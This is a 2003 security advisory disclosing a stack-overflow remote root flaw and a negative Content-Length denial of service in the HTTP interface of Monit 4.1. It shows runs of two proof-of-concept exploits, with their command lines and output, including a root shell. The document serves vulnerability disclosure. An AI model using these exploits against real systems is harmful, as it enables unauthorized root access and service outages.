            S-Quadra Advisory #2003-11-24

Topic: Monit 4.1 HTTP interface Multiple Security Vulnerabilities
Severity: High
Vendor URL: http://www.tildeslash.com/monit/
Advisory URL: http://www.s-quadra.com/advisories/Adv-20031124.txt
Release date: 22 Nov 2003

1. DESCRIPTION

Monit (http://www.tildeslash.com/monit/) is a utility for managing and 
monitoring, processes, files, directories and devices on a Unix system.
It conducts automatic maintenance and repair and can execute meaningful 
causal actions in error situations.
Monit provides a HTTP(S) interface and you can use a browser to access 
the monit server.

There exists several security vulnerabilites in Monit HTTP interface, 
which could allow an attacker
in the worst case to gain root access to the system.

2. DETAILS

-- Vulnerability 1: Long http method stack overflow

By supplying an overly large http request method and attacker could 
trigger a stack overflow condition which may lead to a remote root 
compromise.
Below is a successfull run of 'xonya' Monit <= 4.1 remote root exploit 
(PoC):

$./xonya -t 3 -p 2812 192.168.3.12

Selected platform 3 ...
Retaddr is 0xXXXXXXXX, nulladdr is 0xXXXXXXXX ...
Connected to 192.168.3.12:2812
Sending the request ...
Got a remote shell:

Linux 2.4.20 i686 unknown
uid=0(root) gid=0(root) 
groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
exit

-- Vulnerability 2: Denial of Service via negative Content-Length field

By supplying a negative value in Content-Length header an attacker could 
cause a xmalloc() failure and kill a Monit daemon.
Below is a successfull run of 'donit' Monit <= 4.1 remote Denial of 
Service exploit (PoC):

$./donit -p 2812 192.168.3.12

Connecting to 192.168.3.12:2812 ...
Sending the request ...
Done.

$ nc -v 192.168.3.12 2812
lina.s-quadra.com [192.168.3.12] 2812 (?) : Connection refused
